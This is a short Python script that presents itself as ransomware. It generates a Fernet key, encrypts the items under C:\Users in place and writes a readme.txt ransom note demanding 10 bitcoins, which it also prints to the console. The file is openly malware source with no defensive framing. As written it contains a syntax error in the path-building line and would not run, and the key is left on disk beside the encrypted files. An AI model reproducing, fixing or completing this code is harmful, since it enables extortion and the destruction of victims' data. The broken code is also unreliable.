from cryptography.fernet import Fernet
from colorama import Fore
import time, os

def generateKey():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)
        
def loadKey():
    return open('key.key', 'rb').read()
    
def encriptar(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encripted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encripted_data)
            
if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt='\\' + item for item in items]
    
    generateKey()
    key = loadKey()
    encriptar(full_path, key)
    
    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
        file.write('HELLO, YOU BE HACKED BY DEVBAR WITH THE RANSOMWARE\n')
        file.write('Give me 10 bitcoins to decrypt your data, all the users on your PC have been encrypted for downloading our virus, dirty person or talk in discord')
    print(Fore.GREEN + 'HELLO, YOU BE HACKED BY DEVBAR WITH THE RANSOMWARE\n')
    print(Fore.RED + 'Give me 10 bitcoins to decrypt your data, all the users on your PC have been encrypted for downloading our virus, dirty person or talk in discord')